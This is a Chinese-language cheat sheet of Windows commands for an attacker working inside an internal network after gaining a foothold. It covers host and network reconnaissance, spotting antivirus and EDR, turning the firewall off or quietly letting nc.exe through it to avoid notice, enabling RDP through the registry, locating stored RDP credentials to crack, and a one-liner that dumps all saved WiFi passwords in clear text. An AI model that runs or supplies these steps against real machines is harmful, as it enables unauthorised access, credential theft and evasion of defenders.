Windows内网

ipconfig:收集本机 ip 信息，特别注意有双网卡的情况。

systeminfo:收集主机名、操作系统版本，补丁信息

echo "PROCESSOR_ARCHITECTURE":查看系统架构

wmic product get name,version

poweshell "GET-WmiObject -class win32_product|Select-Object-Property name,version":查看安装的软件及版本

wmic service list brief:查看电脑运行的服务

wmic process list brief

tasklist /svc:查看电脑运行的进程（注意各类杀软、EDR 等安全软件 是否有数据库、代理、网络监控 zabix 等）

wmic startup get command,caption:查看电脑启动项

schtasks /query /fo LIST /v:查看计划任务
如果出现无法加载列资源的错误 输入:chcp 437

net statistics workstation:查看电脑开机时间

wmic useraccount get name,sid：可以查到隐藏用户

net user:查看本地用户

net session:查看会话情况，无权限

netstat -ano:查询电脑端口开放信息和连接情况（可能会找到内网其他服务器 如数据库服务器）

wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list:查询杀软

wmic share get name,path,status

net share:查看共享信息

route print:查看路由信息

netsh firewall show state:查看防火墙信息/netsh advfirewall firewall

netsh firewall set opmode disable:关闭防火墙

netsh advfirewall set allprofiles state off:关闭防火墙（WS2003 之后才能使用该命令）

cmdkey /l :查看 RDP 等凭据信息，如果存在可以破解拿到明文密码

arp -a :查看 arp 信息 可能会泄露内网网段和 ip 地址等信息

dir %APPDATA%\Microsoft\Windows\Recent :查看最近打开的文件

net localgroup :查看本地工作组

net localgroup administrators ：查看组成员信息

C:\Users\kzh\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine :powershell 历史命令
防火墙放行特定程序或端口
直接关闭防火墙动静太大

2003 及之前的版本，允许指定的程序进行全部的连接
netsh firewall add allowedprogram c:\nc.exe "allownc" enable

2003 之后的版本，允许指定的程序进行全部的连接

netsh advfirewall firewall add rule name="pass nc"dir=**in** action=allow program="C:\nc.exe"

允许指定程序退出，命令如下
netsh advfirewall firewall add rule name="Allownc"dir=out action=allow program="C:\nc.exe"

允许 3389 端口放行，命令如下

netsh advfirewall firewall add rule name="RemoteDesktop" protocol=TCP dir=**in** localport=3389 action=allow

开启远程 3389：
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v PortNumber 查看 RDP 端口(0xd3d 为 3389)

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 开启

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f 关闭

dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* :查看 RDP 凭据（可破解

获取 wifi 名称为 xxx 的密码：
netsh wlan show profile name="xxx" key=clear
查看所有 wifi 及密码

**for** /f "skip=9 tokens=1,2 delims=:" %i **in** ('netsh wlan show profiles') do @echo %j | findstr -i -v echo |netsh wlan show profiles %j key=clear
